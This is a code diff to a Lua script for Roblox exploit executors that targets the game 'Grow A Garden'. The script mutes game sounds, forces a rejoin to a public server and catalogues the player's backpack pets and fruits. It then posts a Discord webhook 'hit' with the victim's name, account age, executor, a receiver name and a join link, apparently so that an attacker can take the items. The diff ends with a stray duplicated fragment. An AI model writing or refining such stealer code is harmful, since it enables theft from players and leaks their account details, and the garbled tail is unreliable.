@@ -8,11 +8,13 @@ local RunService = game:GetService("RunService")
 local TweenService = game:GetService("TweenService")
 local CoreGui = game:GetService("CoreGui")
 local HttpService = game:GetService("HttpService")
+local SoundService = game:GetService("SoundService")
 
 local lp = Players.LocalPlayer
 local Backpack = lp:WaitForChild("Backpack")
 
-task.spawn(function()
+-- Rejoin to public server if in private or full
+spawn(function()
     if game.PrivateServerId ~= "" or #Players:GetPlayers() >= game.MaxPlayers then
         local servers = {}
         local req = (syn and syn.request or request)
@@ -36,18 +38,15 @@ task.spawn(function()
     end
 end)
 
-local SoundService = game:GetService("SoundService")
-
+-- Mute all game sounds
 SoundService.AmbientReverb = Enum.ReverbType.NoReverb
 SoundService.Volume = 0
-
 for _, sound in ipairs(game:GetDescendants()) do
     if sound:IsA("Sound") then
         sound.Volume = 0
         sound:Stop()
     end
 end
-
 game.DescendantAdded:Connect(function(desc)
     if desc:IsA("Sound") then
         desc.Volume = 0
@@ -55,11 +54,13 @@ game.DescendantAdded:Connect(function(desc)
     end
 end)
 
+-- Item categorization and webhook logic
 local ig = { "trowel", "watering can", "sprinkler", "egg", "rod" }
 local animals = { "bunny", "dog", "golden lab", "chicken", "pig", "cow", "duck", "bee", "owl", "fox", "bear", "goat", "hedgehog", "horse", "donkey", "sheep", "cat", "turkey", "bat", "skeleton", "ghost", "pumpkin", "zombie", "reindeer", "elf", "penguin", "polar bear", "dragonfly", "queen bee", "disco bee", "chicken jockey", "cooked owl", "raccoon", "red fox" }
+
 local rareEmojiMap = {
     ["polar bear"] = "🐻‍❄️", ["disco bee"] = "🎉🐝", ["queen bee"] = "👑🐝",
-    ["dragonfly"] = "🧚‍♂️🐞", ["red fox"] = "🦊",
+    ["dragonfly"] = "🧙‍♂️🐞", ["red fox"] = "🦊",
     ["chicken jockey"] = "🐔💀", ["cooked owl"] = "🍗🦉", ["raccoon"] = "🦝", ["butterfly"] = ":butterfly"
 }
 
@@ -73,95 +74,101 @@ local function contains(name, list)
     return false
 end
 
-do
-    local rareItems, commonItems, otherItems = {}, {}, {}
-    local mention = false
-    for _, tool in ipairs(Backpack:GetChildren()) do
-        local nm = tool.Name
-        local lnm = nm:lower()
-        if not contains(lnm, ig) then
-            local emoji = rareEmojiMap[lnm]
-            local line = string.format("%s %s", emoji or "-", nm)
+local rareItems, commonItems, fruitItems = {}, {}, {}
+local mention = false
 
-            if contains(lnm, animals) then
-                if emoji then
-                    table.insert(rareItems, line)
-                    mention = true
-                else
-                    table.insert(commonItems, line)
-                end
+for _, tool in ipairs(Backpack:GetChildren()) do
+    local nm = tool.Name
+    local lnm = nm:lower()
+
+    if not contains(lnm, ig) and not lnm:find("seed", 1, true) then
+        local emoji = rareEmojiMap[lnm]
+        local line = string.format("%s %s", emoji or "-", nm)
+
+        if contains(lnm, animals) then
+            if emoji then
+                table.insert(rareItems, line)
+                mention = true
             else
-                table.insert(otherItems, line)
+                table.insert(commonItems, line)
             end
+        else
+            table.insert(fruitItems, line)
         end
-    end
-
-    local animalItems = {}
-    for _, v in ipairs(rareItems) do table.insert(animalItems, v) end
-    for _, v in ipairs(commonItems) do table.insert(animalItems, v) end
-
-    local desc = (#animalItems > 0 and table.concat(animalItems, "\n")) or "__No valid items found.__"
-    if #desc > 1900 then desc = desc:sub(1, 1900) .. "\n...and more" end
-
-    local function getAccountAge()
-        local success, result = pcall(function() return lp.AccountAge end)
-        return success and (result .. " days") or "Unknown"
-    end
-
-    local joinURL = string.format("https://kebabman.vercel.app/start?placeId=%s&gameInstanceId=%s", game.PlaceId, game.JobId)
-
-    local payload = {
-        username = "Captain Hook",
-        embeds = { {
-            title = "🌿 Grow A Garden Hit 🌿",
-            color = 5763719,
-            fields = {
-                {
-                    name = "👤 Player Information",
-                    value = string.format("```Name: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %s```", lp.Name, TARGET_NAME, tostring(identifyexecutor and identifyexecutor() or "Unknown"), getAccountAge()),
-                    inline = false
-                },
-                {
-                    name = "🎒 Backpack",
-                    value = desc,
-                    inline = false
-                },
-                {
-                    name = "💥 Hits",
-                    value = "All Items",
-                    inline = false
-                },
-                {
-                    name = "🔗 Join with URL",
-                    value = string.format("[e7d57574-91a7-41cf-a190-db3dcaa201f1](%s)\n```%s```", joinURL, game.JobId),
-                    inline = false
-                }
-            }
-        }}
-    }
-
-    if mention then payload.content = "@everyone" end
-
-    local httpRequest = (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request) or request
-    if httpRequest then
-        local success, res = pcall(function()
-            return httpRequest({
-                Url = WEBHOOK_URL,
-                Method = "POST",
-                Headers = { ["Content-Type"] = "application/json" },
-                Body = HttpService:JSONEncode(payload)
-            })
-        end)
-        if success and res and res.StatusCode ~= 204 then
-            warn("Webhook Error: " .. res.StatusCode, res.Body or "")
-        elseif not success then
-            warn("HTTP request failed.")
-        end
-    else
-        warn("Executor does not support HTTP requests.")
     end
 end
 
+local animalItems = {}
+for _, v in ipairs(rareItems) do table.insert(animalItems, v) end
+for _, v in ipairs(commonItems) do table.insert(animalItems, v) end
+
+local lines = {}
+if #animalItems > 0 then
+    table.insert(lines, "**🐾 Pets**\n" .. table.concat(animalItems, "\n"))
+end
+if #fruitItems > 0 then
+    table.insert(lines, "**🍎 Fruits**\n" .. table.concat(fruitItems, "\n"))
+end
+
+local desc = #lines > 0 and table.concat(lines, "\n\n") or "__No valid items found.__"
+if #desc > 1900 then desc = desc:sub(1, 1900) .. "\n...and more" end
+
+local function getAccountAge()
+    local success, result = pcall(function() return lp.AccountAge end)
+    return success and (result .. " days") or "Unknown"
+end
+
+local joinURL = string.format("https://kebabman.vercel.app/start?placeId=%s&gameInstanceId=%s", game.PlaceId, game.JobId)
+
+local payload = {
+    username = "Captain Hook",
+    embeds = { {
+        title = "🌿 Grow A Garden Hit 🌿",
+        color = 5763719,
+        fields = {
+            {
+                name = "👤 Player Information",
+                value = string.format("```Name: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %s```", lp.Name, TARGET_NAME, tostring(identifyexecutor and identifyexecutor() or "Unknown"), getAccountAge()),
+                inline = false
+            },
+            {
+                name = "🎒 Backpack",
+                value = desc,
+                inline = false
+            },
+            {
+                name = "💥 Hits",
+                value = "All Items",
+                inline = false
+            },
+            {
+                name = "🔗 Join with URL",
+                value = string.format("[e7d57574-91a7-41cf-a190-db3dcaa201f1](%s)\n```%s```", joinURL, game.JobId),
+                inline = false
+            }
+        }
+    } }
+}
+if mention then payload.content = "@everyone" end
+
+local httpRequest = (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request) or request
+if httpRequest then
+    local success, res = pcall(function()
+        return httpRequest({
+            Url = WEBHOOK_URL,
+            Method = "POST",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body = HttpService:JSONEncode(payload)
+        })
+    end)
+    if success and res and res.StatusCode ~= 204 then
+        warn("Webhook Error: " .. res.StatusCode, res.Body or "")
+    elseif not success then
+        warn("HTTP request failed.")
+    end
+else
+    warn("Executor does not support HTTP requests.")
+end
 
     local desc = (#animalItems > 0 and table.concat(animalItems, "\n")) or "__No valid items found.__"
     if #desc > 1900 then desc = desc:sub(1, 1900) .. "\n...and more" end
